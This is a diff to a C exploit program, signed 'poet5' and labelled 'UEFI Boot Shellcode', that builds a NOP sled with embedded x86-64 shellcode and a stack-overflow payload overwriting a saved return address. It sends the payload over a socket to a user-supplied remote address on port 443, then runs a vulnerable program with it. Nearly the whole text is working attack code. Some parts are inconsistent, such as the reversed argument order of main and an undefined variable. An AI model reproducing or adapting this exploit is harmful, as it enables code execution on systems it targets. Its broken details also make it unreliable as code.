@@ -13,7 +13,8 @@
 /* UEFI Boot Shellcode. */
 
 #define PORT 443
-#define SIZE 160
+#define SIZE 200
+#define OFFSET 18 // Buffer size in Vuln : 10 , RBP 8 Bytes / Stack Frame.
 
  char  sc[]=  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x77\x66\x68\x6e\x6f\x48\x89\xe3"
@@ -42,17 +43,24 @@ int main(char * argv[], int  argc)
     char  *vuln[] = {VULN, p, NULL };
 
     char nop_sled[SIZE];
-    memset(nop_sled, 0x90, SIZE); // Fill the buffer with NOP instructions
+    memset(nop_sled, 0x90, SIZE -sclen -1 ); // Fill the buffer with NOP instructions . -1 gets rid of null terminating character, x05. 
     memcpy(nop_sled + SIZE - sizeof(sc) - 1, sc, sizeof(sc)); // Place the shellcode at the end of the NOP sled
     nop_sled[SIZE - 1] = '\0'; // Null-terminate the buffer
     
     // Declare a pointer, an index, and then a storage for the memory address of sc.
     int *ptr, i, addr;
-    addr = 0xbffffffa - strlen(sc) - strlen(VULN);
-    fprintf(stderr, "[***] using address: %#010x\n", addr); // Return shellcode address.
+    unsigned long ret = 0x7fffffffe000 - strlen(nop_sled) - strlen(VULN); // Adjust address as needed, for multiple systems.
+    fprintf(stderr, "[***] Using address: %#018lx\n", ret);
+    char payload[OFFSET + 8 + 1]; // Buffer size + saved RBP + return address + null terminator
+    memset(payload, 0x90, OFFSET); // Fill with NOPs
+    *((unsigned long *)(payload + OFFSET)) = ret; // Overwrite return address
+    payload[OFFSET + 8] = '\0'; // Null-terminate the payload
+
+    vuln[1] = payload;
 
     // address structure
     char address[256];
+    char address1[256];
     struct hostent* host;
 
     int set, conn; // bind and connect placeholders.
@@ -68,10 +76,11 @@ int main(char * argv[], int  argc)
 
     printf(" Designed by poet5. \n \n");
 
-    printf(" Enter in Linux Build: \n");
+    printf(" Enter in Local: \n");
 
     scanf("%255s", address);
     struct in_addr res; // resolve
+    struct in_addr res1;
 
     printf("Getting host. \n");
 
@@ -84,15 +93,26 @@ int main(char * argv[], int  argc)
     {
         printf(" Host found, initializing connection \n");
     }
+    printf("Enter in Global: \n");
+    scanf("%255s", address1);
     // *( struct in_addr*)host->h_addr_list
+    if (inet_aton(address1, &res1) == 0 )
+    {
+        fprintf(stderr, "IP Invalid %s \n", address1);
+        exit(EXIT_FAILURE);
+    }
+    else 
+    {
+        printf(" Host found, initializing connection \n");
+    }
 
     sockaddr_in storage;
-    storage.sin_addr.s_addr = INADDR_ANY;
+    storage.sin_addr.s_addr = inet_addr(address);
     storage.sin_family = AF_INET;
     storage.sin_port = htons(PORT); // Port 0 is for dynamic port.
     printf("Storage resolved. \n");
     sockaddr_in remote;
-    remote.sin_addr.s_addr = inet_addr(address);
+    remote.sin_addr.s_addr = inet_addr(address1);
     remote.sin_family = AF_INET;
     remote.sin_port = htons(PORT);
     printf("Binding \n");
@@ -124,13 +144,13 @@ int main(char * argv[], int  argc)
     printf("Connection, complete.");
 
     // Send the shellcode
-    if (send(ipv4, sc, sizeof(sc), 0) < 0) {
+    if (send(ipv4, payload, sizeof(payload), 0) < 0) {
         perror("send");
         exit(EXIT_FAILURE);
     }
     printf("Complete. \n");
     // Close the socket
-    execle(vuln[0], (char*)vuln, p, NULL, env);
+    execle(vuln[0], vuln[1], p, NULL, env);
     printf("Executed vulnerability.");
     close(ipv4);
     free(header);
